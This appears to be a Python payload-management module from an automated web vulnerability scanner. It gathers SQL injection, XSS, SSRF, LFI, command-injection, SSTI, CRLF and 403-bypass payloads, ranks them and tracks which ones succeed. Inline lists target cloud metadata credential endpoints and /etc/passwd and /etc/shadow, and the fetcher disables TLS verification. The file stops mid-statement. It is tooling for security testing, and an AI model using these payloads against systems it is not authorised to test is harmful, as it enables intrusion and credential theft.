"""
engine/payload_manager.py — Structured high-performance payload system

Sources (in priority order):
  1. external_tools/payloads-main/   — already on disk, always available
  2. PayloadAllTheThings (GitHub raw) — authoritative, well-maintained
  3. Assetnote wordlists (GitHub raw) — api/endpoint focused
  4. payload_intel DB                 — canonical families + H1-observed

Architecture:
  - In-memory cache (populated once per process lifetime)
  - Deduplication via normalized hash
  - Per-category scoring: shorter first, high-signal first
  - Smart selection: context-aware subset per bug type
  - Caps: max 10k per category in cache, top_n per call
"""

import re, json, time, hashlib, logging, threading
from pathlib import Path
from typing import Dict, List, Optional, Tuple
import urllib.request, urllib.error, ssl

log = logging.getLogger("elite.payload_manager")

# ── Paths ─────────────────────────────────────────────────────────────────────

_BASE        = Path(__file__).parent.parent
_LOCAL       = _BASE / "external_tools" / "payloads-main"
_ASSETNOTE   = _BASE / "external_tools" / "assetnote-wordlists"
_PAT         = _BASE / "external_tools" / "payloadsallthethings"

# ── Cache ─────────────────────────────────────────────────────────────────────

_CACHE: Dict[str, List[str]] = {}   # tag → deduped list (capped at 10k)
_CACHE_TS:  float             = 0.0
_CACHE_LOCK = threading.Lock()
_CACHE_TTL  = 3600            # re-build if older than 1 hour

# Max payloads kept per category in cache
_CAP = 10_000

def _ssl():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    return ctx

def _fetch(url: str, timeout: int = 15) -> str:
    """Fetch URL text. Returns '' on any error."""
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "TMR/2.0"})
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl()) as r:
            return r.read(5_000_000).decode("utf-8", errors="replace")
    except Exception as e:
        log.debug(f"[payloads] fetch {url}: {e}")
        return ""

def _clean(lines: List[str], max_len: int = 500) -> List[str]:
    """Remove blanks, comments, duplicates; cap length."""
    seen: set = set()
    out: List[str] = []
    for l in lines:
        l = l.strip()
        if not l or l.startswith("#") or len(l) > max_len:
            continue
        h = hashlib.md5(l.encode()).hexdigest()
        if h not in seen:
            seen.add(h)
            out.append(l)
    return out

def _score(payload: str) -> int:
    """
    Score a payload: lower = better (sort ascending).
    Shorter payloads tested first; high-signal patterns boosted.
    """
    s = len(payload)                          # length penalty
    if any(k in payload.lower() for k in     # timing-based — slow, run later
           ["sleep","waitfor","delay","benchmark"]): s += 200
    if "{{" in payload or "}}" in payload:    # template markers — high signal
        s -= 20
    if "169.254" in payload or "metadata" in payload.lower(): s -= 30
    if "<script" in payload.lower():          # basic XSS — low signal
        s += 50
    return s

def _sorted_payloads(payloads: List[str]) -> List[str]:
    return sorted(payloads, key=_score)


# ── Source: PayloadAllTheThings (GitHub raw) ───────────────────────────────────

# Map: tag → list of PAT GitHub raw URLs
_PAT_SOURCES: Dict[str, List[str]] = {
    # ── SQLi ──────────────────────────────────────────────────────────────────
    "sqli_error": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/FUZZ-error-messages.txt",
    ],
    "sqli_time": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/FUZZ-sleep.txt",
    ],
    "sqli_union": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/FUZZ-union.txt",
    ],
    "sqli_auth_bypass": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/FUZZ-bypass-login-form.txt",
    ],
    # ── XSS ───────────────────────────────────────────────────────────────────
    "xss_reflected": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruder/FUZZ-XSS-Bypass-WAF.txt",
    ],
    "xss_polyglot": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruder/FUZZ-XSS-polyglots.txt",
    ],
    "xss_blind": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruder/FUZZ-XSS-Blind.txt",
    ],
    "xss_dom": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruder/FUZZ-XSS-JHADDIX.txt",
    ],
    # ── SSRF ──────────────────────────────────────────────────────────────────
    "ssrf_cloud": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/Intruder/FUZZ-metadata-cloud.txt",
    ],
    "ssrf_internal": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/Intruder/FUZZ-local-network.txt",
    ],
    "ssrf_bypass": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/Intruder/FUZZ-bypass.txt",
    ],
    # ── LFI ───────────────────────────────────────────────────────────────────
    "lfi_unix": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruder/FUZZ-Linux.txt",
    ],
    "lfi_win": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruder/FUZZ-Windows.txt",
    ],
    "lfi_bypass": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruder/FUZZ-LFI-jhaddix.txt",
    ],
    # ── RCE ───────────────────────────────────────────────────────────────────
    "rce_unix": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/Intruder/FUZZ-linux.txt",
    ],
    "rce_win": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/Intruder/FUZZ-windows.txt",
    ],
    # ── SSTI ──────────────────────────────────────────────────────────────────
    "ssti_detect": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Intruder/FUZZ-SSTI-detection.txt",
    ],
    "ssti_jinja2": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Intruder/FUZZ-jinja2.txt",
    ],
    # ── Open Redirect ─────────────────────────────────────────────────────────
    "redirect_open": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Open%20Redirect/Intruder/FUZZ.txt",
    ],
    # ── 403 Bypass ────────────────────────────────────────────────────────────
    "headers_403": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/Intruder/FUZZ-bypass-403.txt",
    ],
    # ── CRLF ──────────────────────────────────────────────────────────────────
    "crlf": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/CRLF%20Injection/Intruder/FUZZ-CRLF.txt",
    ],
    # ── XXE ───────────────────────────────────────────────────────────────────
    "xxe": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XXE%20Injection/Intruder/FUZZ-xxe.txt",
    ],
}

# ── Source: Assetnote (GitHub raw, public) ────────────────────────────────────

_ASSETNOTE_SOURCES: Dict[str, List[str]] = {
    "api_endpoints": [
        "https://raw.githubusercontent.com/assetnote/wordlists/main/data/automated/httparchive_apiroutes_2024.txt",
        "https://raw.githubusercontent.com/assetnote/wordlists/main/data/manual/nametoapi.txt",
    ],
    "graphql": [
        "https://raw.githubusercontent.com/assetnote/wordlists/main/data/manual/graphql.txt",
    ],
    "headers_bypass": [
        "https://raw.githubusercontent.com/assetnote/wordlists/main/data/manual/httpheaders.txt",
    ],
    "api_params": [
        "https://raw.githubusercontent.com/assetnote/wordlists/main/data/automated/httparchive_parameters_top_1m_2024.txt",
    ],
    "js_files": [
        "https://raw.githubusercontent.com/assetnote/wordlists/main/data/automated/httparchive_js_2024.txt",
    ],
    "tech_spring": [
        "https://raw.githubusercontent.com/assetnote/wordlists/main/data/technology/spring.txt",
    ],
    "tech_rails": [
        "https://raw.githubusercontent.com/assetnote/wordlists/main/data/technology/rails.txt",
    ],
    "tech_django": [
        "https://raw.githubusercontent.com/assetnote/wordlists/main/data/technology/django.txt",
    ],
}

# ── Source: local payloads-main/ ──────────────────────────────────────────────

_LOCAL_SOURCES: Dict[str, str] = {
    # ── SQLi ──────────────────────────────────────────────────────────────────
    "sqli":              "allsqli.txt",          # 584 lines — general SQLi
    "sqli_blind":        "blindsqli.txt",         # 95  lines — blind/timing
    "sqli_time":         "blindsqli.txt",         # alias → time-based subset
    "sqli_error":        "allsqli.txt",           # alias → error-based subset
    "sqli_union":        "SQL.txt",               # 288 lines — union/select probes
    "sqli_xor":          "xor.txt",               # 51  lines — XOR obfuscation
    "sqli_db":           "sqldb.txt",             # 534 lines — DB-specific
    # ── SSRF ──────────────────────────────────────────────────────────────────
    "ssrf_cloud":        "ssrf.txt",              # 122 lines — cloud/metadata
    "ssrf_bypass":       "ssrf.txt",              # alias — same file, bypass subset
    "ssrf_internal":     "ssrf.txt",              # alias — internal network targets
    # ── XSS ───────────────────────────────────────────────────────────────────
    "xss_reflected":     "xss.txt",              # 2669 lines — reflected XSS
    "xss_waf":           "xsswafbypss.txt",       # 101  lines — WAF bypass
    "xss_polyglot":      "xsspollygots.txt",      # 95   lines — polyglots
    # ── LFI ───────────────────────────────────────────────────────────────────
    "lfi_unix":          "directory_traversal_unix.txt",   # 871 lines
    "lfi_win":           "directory_traversal_win.txt",    # 847 lines
    "lfi_bypass":        "directory_traversal_unix.txt",   # alias — bypass probes
    # ── SSTI ──────────────────────────────────────────────────────────────────
    "ssti":              "ssti.txt",              # 107 lines
    "ssti_detect":       "ssti.txt",              # alias — detection payloads
    # ── Headers / 403 ─────────────────────────────────────────────────────────
    "headers_403":       "403_header_payloads.txt",  # 42  lines
    "url_403":           "403_url_payloads.txt",     # 236 lines
    "crlf":              "crlf.txt",               # 63  lines
    # ── Discovery ─────────────────────────────────────────────────────────────
    "backup":            "backup_files_only.txt",  # 1035 lines
    "backup_all":        "all-files-leaked.txt",   # 676  lines
    "config":            "config.txt",             # 48   lines
    "env_files":         "env.txt",               # 590  lines
    "juicy_paths":       "juicy-paths.txt",        # 70   lines
    "admin":             "admin.txt",              # 7683 lines
    "all_attacks":       "all_attacks.txt",        # 467  lines
    "params":            "params.txt",             # 10253 lines
}

# ── Source health tracking ────────────────────────────────────────────────────
_SOURCE_HEALTH: Dict[str, any] = {
    "files_found":      [],
    "files_missing":    [],
    "lines_loaded":     {},   # tag → count
    "tags_loaded":      [],
    "failed_sources":   [],   # (tag, path, reason)
    "last_fetch_error": "",
    "last_build_ts":    0.0,
}

# ── Inline canonical payloads (always available, high signal) ─────────────────

_INLINE: Dict[str, List[str]] = {
    "sqli_time": [
        "' AND SLEEP(5)--", "1 AND SLEEP(5)--", "' OR SLEEP(5)--",
        "1; WAITFOR DELAY '0:0:5'--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND BENCHMARK(5000000,MD5(1))--", "1 OR 1=SLEEP(5)--",
    ],
    "sqli_error": [
        "'", "''", "' OR '1'='1", "' OR 1=1--", "1'", "1\"",
        "' OR '1'='1'--", "1 OR 1=1", "' AND '1'='1", "1; DROP TABLE--",
        "') OR ('1'='1", "' UNION SELECT NULL--",
    ],
    "sqli_union": [
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--", "1 UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
    ],
    "ssrf_cloud": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
        "http://192.0.0.192/",  # Oracle Cloud
    ],
    "ssrf_internal": [
        "http://127.0.0.1/", "http://localhost/", "http://0.0.0.0/",
        "http://[::]/" , "http://[::1]/", "http://0/",
        "http://127.1/", "http://127.0.1/", "http://localhost.localdomain/",
        "http://①②⑦.0.0.1/",  # Unicode bypass
        "http://2130706433/",   # decimal IP
        "http://0x7f000001/",   # hex IP
    ],
    "ssrf_bypass": [
        "http://169.254.169.254.xip.io/", "http://169.254.169.254.nip.io/",
        "http://[::ffff:169.254.169.254]/", "http://[::ffff:a9fe:a9fe]/",
        "http://0251.0376.0251.0376/",   # octal
        "http://169.254.169.254.localtest.me/",
        "dict://127.0.0.1:6379/", "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",
    ],
    "lfi_unix": [
        "../../../../etc/passwd", "../../../../../etc/passwd",
        "../../../../../../etc/passwd", "../../../../etc/shadow",
        "....//....//etc/passwd", "..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252Fetc%252Fpasswd",  # double encoded
        "../../../../proc/self/environ", "../../../../proc/version",
        "/etc/passwd", "%2Fetc%2Fpasswd", "..././..././etc/passwd",
    ],
    "xss_reflected": [
        "<tmr-xss>", "<script>alert(1)</script>",
        "\"><script>alert(1)</script>", "'><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
        "<body onload=alert(1)>", "javascript:alert(1)",
        "'\"--><script>alert(1)</script>",
        "<details/open/ontoggle=alert(1)>",
    ],
    "xss_polyglot": [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>>",
        "\";alert(1)//",  "');alert(1)//",
        "--><script>alert(1)</script>", "</script><script>alert(1)</script>",
    ],
    "ssti_detect": [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
        "{{config}}", "${config}", "{{''.__class__.__mro__}}",
        "{{''.class_}}", "@(7+7)",
    ],
    "redirect_open": [
        "https://evil.com", "//evil.com", "\\evil.com",
        "https://evil.com%23", "https://evil.com%3F",
        "/\\evil.com", "//evil.com/%2F..", "https://evil.com@legitimate.com",
        "javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
    ],
    "rce_unix": [
        "; id", "| id", "` id`", "$(id)", "; ls -la", "| ls",
        "; cat /etc/passwd", "|cat /etc/passwd", ";sleep 5", "|sleep 5",
        "$(sleep 5)", "`sleep 5`",
    ],
    "crlf": [
        "%0d%0aSet-Cookie:loxs=injected", "%0d%0aX-TMR-Injected:confirmed",
        "%0a%0dSet-Cookie:loxs=injected", "%0aSet-Cookie:loxs=injected",
        "%0d%0a%0d%0aSet-Cookie:loxs=injected",
        "%u000aSet-Cookie:loxs=injected",
    ],
    "headers_403": [
        "X-Forwarded-For: 127.0.0.1", "X-Real-IP: 127.0.0.1",
        "X-Originating-IP: 127.0.0.1", "X-Client-IP: 127.0.0.1",
        "X-Remote-IP: 127.0.0.1", "X-Remote-Addr: 127.0.0.1",
        "X-Original-URL: /admin", "X-Rewrite-URL: /admin",
        "X-Custom-IP-Authorization: 127.0.0.1",
        "X-Forwarded-Host: localhost",
    ],
}

# ── Tag → bug_type mapping (for payload_intel ingestion) ──────────────────────

_TAG_BUG_TYPE: Dict[str, str] = {
    "sqli": "sqli", "sqli_time": "sqli", "sqli_error": "sqli",
    "sqli_union": "sqli", "sqli_blind": "sqli", "sqli_auth_bypass": "sqli",
    "sqli_xor": "sqli", "sqli_db": "sqli",
    "xss": "xss", "xss_reflected": "xss", "xss_polyglot": "xss",
    "xss_blind": "xss", "xss_dom": "xss", "xss_waf": "xss",
    "ssrf": "ssrf", "ssrf_cloud": "ssrf", "ssrf_internal": "ssrf",
    "ssrf_bypass": "ssrf",
    "lfi": "lfi", "lfi_unix": "lfi", "lfi_win": "lfi", "lfi_bypass": "lfi",
    "rce": "rce", "rce_unix": "rce", "rce_win": "rce",
    "ssti": "ssti", "ssti_detect": "ssti", "ssti_jinja2": "ssti",
    "redirect": "redirect", "redirect_open": "redirect",
    "headers_403": "headers", "headers_bypass": "headers", "url_403": "headers",
    "crlf": "crlf", "xxe": "xxe",
    "api_endpoints": "api", "api_params": "api", "graphql": "graphql",
}

# ── Smart context rules ────────────────────────────────────────────────────────

_SMART_RULES: Dict[str, Dict] = {
    "ssrf": {
        "primary":   ["ssrf_cloud", "ssrf_bypass", "ssrf_internal"],
        "param_boost": {
            "url":      ["ssrf_cloud", "ssrf_bypass"],
            "callback": ["ssrf_cloud", "ssrf_internal"],
            "webhook":  ["ssrf_cloud", "ssrf_internal"],
            "dest":     ["ssrf_bypass", "ssrf_cloud"],
            "proxy":    ["ssrf_internal", "ssrf_bypass"],
        },
        "default_limit": 40,
    },
    "sqli": {
        "primary": ["sqli_error", "sqli_time", "sqli_union", "sqli_blind"],
        "param_boost": {
            "id":     ["sqli_error", "sqli_time"],
            "sort":   ["sqli_error", "sqli_union"],
            "order":  ["sqli_error", "sqli_union"],
            "filter": ["sqli_union", "sqli_error"],
            "search": ["sqli_error", "sqli_union"],
            "q":      ["sqli_error", "sqli_union"],
        },
        "default_limit": 30,
    },
    "xss": {
        "primary": ["xss_reflected", "xss_polyglot", "xss_dom", "xss_waf"],
        "param_boost": {
            "q":       ["xss_reflected", "xss_waf"],
            "search":  ["xss_reflected", "xss_waf"],
            "name":    ["xss_reflected", "xss_polyglot"],
            "comment": ["xss_polyglot", "xss_blind"],
            "body":    ["xss_polyglot", "xss_dom"],
        },
        "default_limit": 25,
    },
    "lfi": {
        "primary": ["lfi_unix", "lfi_bypass", "lfi_win"],
        "param_boost": {
            "file":     ["lfi_unix", "lfi_bypass"],
            "path":     ["lfi_bypass", "lfi_unix"],
            "template": ["lfi_bypass", "lfi_unix"],
            "page":     ["lfi_unix"],
            "include":  ["lfi_bypass"],
            "lang":     ["lfi_unix"],
        },
        "default_limit": 25,
    },
    "ssti": {
        "primary": ["ssti_detect", "ssti_jinja2"],
        "default_limit": 20,
    },
    "rce": {
        "primary": ["rce_unix", "rce_win"],
        "default_limit": 20,
    },
    "redirect": {
        "primary": ["redirect_open"],
        "default_limit": 15,
    },
    "headers": {
        "primary": ["headers_403", "headers_bypass", "url_403"],
        "default_limit": 20,
    },
    "crlf": {
        "primary": ["crlf"],
        "default_limit": 12,
    },
}


# ── Cache builder ─────────────────────────────────────────────────────────────

def _build_cache() -> Dict[str, List[str]]:
    """Build in-memory payload cache from all sources. Returns {tag: [payloads]}."""
    cache: Dict[str, List[str]] = {}

    # 1. Inline canonical (always available, highest priority)
    for tag, payloads in _INLINE.items():
        cache.setdefault(tag, [])
        cache[tag] = _clean(cache[tag] + payloads)
        log.debug(f"[payloads] inline {tag}: {len(payloads)}")

    # 2. Local payloads-main/ (on disk, always-available, primary fallback)
    _seen_files: set = set()
    for tag, fname in _LOCAL_SOURCES.items():
        path = _LOCAL / fname
        if not path.exists():
            _SOURCE_HEALTH["files_missing"].append(str(path))
            _SOURCE_HEALTH["failed_sources"].append(
                (tag, str(path), "file_not_found")
            )
            log.warning(f"[payloads] local {tag}: MISSING {path}")
            continue
        try:
            text  = path.read_text(errors="replace")
            lines = _clean(text.splitlines())
            cache.setdefault(tag, [])
            before = len(cache[tag])
            cache[tag] = _clean(cache[tag] + lines)
            added  = len(cache[tag]) - before
            _SOURCE_HEALTH["lines_loaded"][tag] = _SOURCE_HEALTH["lines_loaded"].get(tag, 0) + added
            if tag not in _SOURCE_HEALTH["tags_loaded"]:
                _SOURCE_HEALTH["tags_loaded"].append(tag)
            if str(path) not in _seen_files:
                _seen_files.add(str(path))
                _SOURCE_HEALTH["files_found"].append({
                    "path": str(path),
                    "file": fname,
                    "raw_lines": len(text.splitlines()),
                    "clean_lines": len(lines),
                })
            log.debug(f"[payloads] local {tag}: +{added} ({fname}: {len(lines)} clean lines)")
        except Exception as e:
            err = f"{type(e).__name__}: {e}"
            _SOURCE_HEALTH["failed_sources"].append((tag, str(path), err))
            log.warning(f"[payloads] local {tag}: read error — {err}")

    # 3. Assetnote (GitHub raw, network) — cap per file at 5k lines
    for tag, urls in _ASSETNOTE_SOURCES.items():
        fetched = False
        for url in urls:
            text = _fetch(url)
            if not text:
                continue
            loaded = _clean(text.splitlines()[:5000])
            cache.setdefault(tag, [])
            before = len(cache[tag])
            cache[tag] = _clean(cache[tag] + loaded)
            added  = len(cache[tag]) - before
            _SOURCE_HEALTH["lines_loaded"][tag] = _SOURCE_HEALTH["lines_loaded"].get(tag, 0) + added
            if tag not in _SOURCE_HEALTH["tags_loaded"]:
                _SOURCE_HEALTH["tags_loaded"].append(tag)
            log.info(f"[payloads] assetnote {tag}: +{added} from {url.split('/')[-1]}")
            fetched = True
            break
        if not fetched:
            _SOURCE_HEALTH["failed_sources"].append((tag, urls[0], "network_fetch_failed"))
            _SOURCE_HEALTH["last_fetch_error"] = f"assetnote/{tag}: all URLs failed"
            log.warning(f"[payloads] assetnote {tag}: network fetch failed for all {len(urls)} URLs")

    # 4. PAT (GitHub raw, network) — focused attack payloads
    for tag, urls in _PAT_SOURCES.items():
        fetched = False
        for url in urls:
            text = _fetch(url)
            if not text:
                continue
            loaded = _clean(text.splitlines())
            cache.setdefault(tag, [])
            before = len(cache[tag])
            cache[tag] = _clean(cache[tag] + loaded)
            added  = len(cache[tag]) - before
            _SOURCE_HEALTH["lines_loaded"][tag] = _SOURCE_HEALTH["lines_loaded"].get(tag, 0) + added
            if tag not in _SOURCE_HEALTH["tags_loaded"]:
                _SOURCE_HEALTH["tags_loaded"].append(tag)
            log.info(f"[payloads] pat {tag}: +{added} from {url.split('/')[-1]}")
            fetched = True
            break
        if not fetched:
            _SOURCE_HEALTH["failed_sources"].append((tag, urls[0], "network_fetch_failed"))
            log.warning(f"[payloads] pat {tag}: network fetch failed — using local fallback only")

    # Sort and cap each category
    for tag in cache:
        cache[tag] = _sorted_payloads(_clean(cache[tag]))[:_CAP]

    return cache


def _ensure_cache(force: bool = False) -> Dict[str, List[str]]:
    """Return cache, building if stale or empty."""
    global _CACHE, _CACHE_TS
    with _CACHE_LOCK:
        if not force and _CACHE and (time.time() - _CACHE_TS) < _CACHE_TTL:
            return _CACHE
        t0 = time.monotonic()
        # Reset health before rebuild
        _SOURCE_HEALTH["files_found"]      = []
        _SOURCE_HEALTH["files_missing"]    = []
        _SOURCE_HEALTH["lines_loaded"]     = {}
        _SOURCE_HEALTH["tags_loaded"]      = []
        _SOURCE_HEALTH["failed_sources"]   = []
        _SOURCE_HEALTH["last_fetch_error"] = ""
        _SOURCE_HEALTH["last_build_ts"]    = time.time()
        _CACHE    = _build_cache()
        _CACHE_TS = time.time()
        total     = sum(len(v) for v in _CACHE.values())
        elapsed   = round(time.monotonic() - t0, 2)
        log.info(
            f"[payloads] cache built: {len(_CACHE)} tags, {total} total payloads"
            f" in {elapsed}s"
        )
        for tag, pl in sorted(_CACHE.items()):
            if pl:
                log.info(f"[payloads] loaded: {tag}={len(pl)}")
        return _CACHE


# ── Public API ────────────────────────────────────────────────────────────────

def load_assetnote_payloads(force: bool = False) -> Dict[str, int]:
    """
    Download Assetnote + PAT wordlists and populate cache.
    Returns {tag: count} for all categories loaded.
    """
    log.info("[payloads] loading Assetnote + PAT wordlists...")
    cache = _ensure_cache(force=force)

    # Also ingest into payload_intel DB for ranked selection
    try:
        from engine.payload_intel import ingest_from_h1
        ingested = 0
        for tag, payloads in cache.items():
            bt = _TAG_BUG_TYPE.get(tag, "")
            if bt and payloads:
                n = ingest_from_h1(bt, payloads[:500], source_url=f"payload_manager:{tag}")
                ingested += n
        log.info(f"[payloads] ingested {ingested} new variants into payload_intel DB")
    except Exception as e:
        log.debug(f"[payloads] payload_intel ingest: {e}")

    return {tag: len(pl) for tag, pl in cache.items()}


def get_payloads(tag: str, limit: int = 100) -> List[str]:
    """
    Get payloads for a specific tag.
    Returns sorted, deduplicated list capped at limit.

    [payloads] smart_select bug=... → N payloads
    """
    cache = _ensure_cache()
    result = cache.get(tag, [])[:limit]
    log.info(f"[payloads] get_payloads tag={tag} → {len(result)} payloads")
    return result


def get_smart_payloads(bug_type: str,
                       param_name: str   = "",
                       surface: str      = "",
                       limit: int        = 50,
                       prefer_db: bool   = True) -> List[str]:
    """
    Context-aware payload selection for a bug type.

    1. Try payload_intel DB ranked selection (respects param affinity, scoring)
    2. Fall back to cache smart rules if DB has < 5 payloads

    [payloads] smart_select bug=ssrf → 40 payloads
    [payloads] injected into scanner
    """
    payloads: List[str] = []

    # Try ranked DB selection first
    if prefer_db:
        try:
            from engine.payload_intel import select_payloads, _ensure_bootstrapped
            _ensure_bootstrapped()
            db_payloads = select_payloads(
                bug_type   = bug_type,
                param_name = param_name,
                surface    = surface or "web",
                top_n      = limit,
            )
            if len(db_payloads) >= 5:
                log.info(
                    f"[payloads] smart_select bug={bug_type}"
                    f" param={param_name or 'any'} → {len(db_payloads)} payloads"
                    f" [source: payload_intel_db]"
                )
                log.info(f"[payloads] injected into scanner")
                return db_payloads
        except Exception as e:
            log.debug(f"[payloads] db selection: {e}")

    # Cache-based smart selection
    cache  = _ensure_cache()
    rules  = _SMART_RULES.get(bug_type, {})
    tags   = list(rules.get("primary", [bug_type]))
    cap    = rules.get("default_limit", limit)

    # Param boost: reorder tags based on context
    if param_name and "param_boost" in rules:
        boosted = rules["param_boost"].get(param_name.lower(), [])
        if boosted:
            tags = boosted + [t for t in tags if t not in boosted]

    # Collect from prioritized tags, dedup
    seen:    set        = set()
    result:  List[str] = []
    for tag in tags:
        for p in cache.get(tag, []):
            if p not in seen:
                seen.add(p)
                result.append(p)
            if len(result) >= cap:
                break
        if len(result) >= cap:
            break

    # Fill from generic tag if short
    if len(result) < 5:
        for p in cache.get(bug_type, []):
            if p not in seen:
                seen.add(p)
                result.append(p)
            if len(result) >= cap:
                break

    result = result[:min(limit, cap)]

    log.info(
        f"[payloads] smart_select bug={bug_type}"
        f" param={param_name or 'any'} → {len(result)} payloads"
        f" [source: cache tags={tags[:3]}]"
    )
    log.info(f"[payloads] injected into scanner")
    return result


def list_tags() -> Dict[str, int]:
    """Return all available tags and their payload counts."""
    return {tag: len(pl) for tag, pl in _ensure_cache().items() if pl}


def get_stats() -> Dict:
    """Return payload system statistics."""
    cache = _ensure_cache()
    by_bug: Dict[str, int] = {}
    for tag, pl in cache.items():
        bt = _TAG_BUG_TYPE.get(tag, tag)
        by_bug[bt] = by_bug.get(bt, 0) + len(pl)
    return {
        "total_tags":     len(cache),
        "total_payloads": sum(len(v) for v in cache.values()),
        "by_bug_type":    by_bug,
        "cache_age_s":    round(time.time() - _CACHE_TS, 0),
        "tags":           {t: len(p) for t, p in sorted(cache.items()) if p},
    }


def refresh(background: bool = True) -> None:
    """Force cache rebuild. If background=True, runs in daemon thread."""
    if background:
        import threading
        threading.Thread(
            target=lambda: _ensure_cache(force=True),
            daemon=True, name="payload-refresh"
        ).start()
        log.info("[payloads] background refresh started")
    else:
        _ensure_cache(force=True)


# ══════════════════════════════════════════════════════════════════════════════
# PAYLOAD INTELLIGENCE v2
# ══════════════════════════════════════════════════════════════════════════════

import hashlib as _hashlib
import sqlite3 as _sqlite3

# ── Feedback DB ───────────────────────────────────────────────────────────────

_FB_PATH = Path(__file__).parent.parent / "data" / "payload_feedback.db"
_FB_LOCK  = threading.Lock()
_FB_CONN: _sqlite3.Connection = None


def _fb_db() -> _sqlite3.Connection:
    global _FB_CONN
    if _FB_CONN is None:
        _FB_PATH.parent.mkdir(parents=True, exist_ok=True)
        conn = _sqlite3.connect(str(_FB_PATH), check_same_thread=False)
        conn.row_factory = _sqlite3.Row
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS payload_feedback (
                id             INTEGER PRIMARY KEY AUTOINCREMENT,
                bug_type       TEXT    NOT NULL,
                payload_hash   TEXT    NOT NULL,
                payload_short  TEXT    NOT NULL,
                family         TEXT    DEFAULT '',
                success_count  INTEGER DEFAULT 0,
                fail_count     INTEGER DEFAULT 0,
                last_seen      INTEGER DEFAULT 0,
                last_param     TEXT    DEFAULT '',
                last_context   TEXT    DEFAULT '',
                UNIQUE(bug_type, payload_hash)
            );
            CREATE INDEX IF NOT EXISTS idx_fb_bug ON payload_feedback(bug_type);
        """)
        conn.commit()
        _FB_CONN = conn
    return _FB_CONN


def _ph(payload: str) -> str:
    return _hashlib.sha256(payload.encode()).hexdigest()[:16]


def record_payload_success(bug_type: str, payload: str,
                           url: str = "", param: str = "",
                           family: str = "", context: dict = None) -> None:
    """
    Record that EIL validation confirmed a finding with this payload.
    Boosts payload_intel confidence AND writes to feedback DB.

    [payload-v2] feedback success bug=... family=... payload_hash=...
    """
    ph = _ph(payload)
    ctx_str = json.dumps(context or {}, separators=(",", ":"))[:200]
    try:
        with _FB_LOCK:
            db = _fb_db()
            db.execute("""
                INSERT INTO payload_feedback
                    (bug_type, payload_hash, payload_short, family,
                     success_count, last_seen, last_param, last_context)
                VALUES (?,?,?,?,1,?,?,?)
                ON CONFLICT(bug_type, payload_hash) DO UPDATE SET
                    success_count = success_count + 1,
                    last_seen     = excluded.last_seen,
                    last_param    = excluded.last_param,
                    last_context  = excluded.last_context,
                    family        = COALESCE(NULLIF(excluded.family,''), family)
            """, (bug_type, ph, payload[:60], family or "",
                  int(time.time()), param[:40], ctx_str))
            db.commit()
    except Exception as e:
        log.debug(f"[payload-v2] feedback write: {e}")

    # Also boost payload_intel DB confidence
    try:
        from engine.payload_intel import record_payload_hit as _pi_hit
        _pi_hit(bug_type, payload)
    except Exception:
        pass

    # And learning.py
    try:
        from engine.learning import record_payload_hit as _learn_hit
        _learn_hit(payload, bug_type, [], param=param)
    except Exception:
        pass

    log.info(
